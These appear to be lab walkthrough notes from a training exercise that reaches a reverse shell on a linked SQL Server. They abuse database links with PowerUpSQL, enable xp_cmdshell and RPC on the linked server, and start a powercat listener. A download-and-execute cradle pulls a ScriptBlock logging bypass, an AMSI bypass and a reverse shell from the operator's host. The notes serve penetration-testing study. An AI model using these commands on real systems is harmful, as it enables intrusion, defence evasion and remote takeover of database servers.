
Task 

• Get a reverse shell on a db-sqlsrv in db.local forest by abusing database links from us-mssql.


Let’s first enumerate database links on all the sql servers, we just need public access on for that. Let’s see if studentuserx has that access on any database in the domain. We will use PowerUpSQL for this from InvisiShell:

```
Import-Module .\PowerupSQL-master\PowerupSQL.psd1
```

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```


![[Pasted image 20250325161848.png]]

So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql:


```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local - Verbose
```


![[Pasted image 20250325162105.png]]


So, there is a database link to a SQL Server from us-mssql server. Using HeidiSQL client, let’s login to usmssql using windows authentication of studentuserx. Once logged-in, use openquery to enumerate linked databases:

We can also use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically:
```
 Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

![[Pasted image 20250325162152.png]]

So, we do have database links to other SQL Servers. If xp_cmdshell is enabled (or rpcout is true that allows us to enable xp_cmdshell), it is possible to execute commands on any node in the database links using the below commands

Try to execute a command on each node where xp_cmdshell is enabled:

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

![[Pasted image 20250325162300.png]]

Sweet! Looks like we can run operating system commands on DB-SQLPROD instance. Let’s try to execute a PowerShell reverse shell. We must first start a listener from InvisiShell:


```
. .\powercat.ps1
```

```
powercat -l -v -p 443 -t 1000
```

Now, use the PowerShell download execute cradle to run the reverse shell on DB-SQLPROD. Note that in the below command, we first run an ScriptBlock logging bypass, then an AMSI bypass and finally, the reverse shell. Remember to host all of them on a local web server:

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.139/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.139/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.139/Invoke-PowerShellTcpEx.ps1)"'''
```

![[Pasted image 20250325162435.png]]

On listener on 192.168.100.X. Note that you may need to press 'Enter' couple of times on powercat listener to wake it up from slumber:

![[Pasted image 20250325162537.png]]

```
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
```

```
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

```

```
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [db-sqlsrv]"

```

```
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [db-sqlsrv]"
```

Let's try to execute commands on all the link nodes again and check if it works on db-sqlsrv too:

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

![[Pasted image 20250325162753.png]]

use the below command from PowerUpSQL:

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.139/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.139/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.139/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```

![[Pasted image 20250325162834.png]]


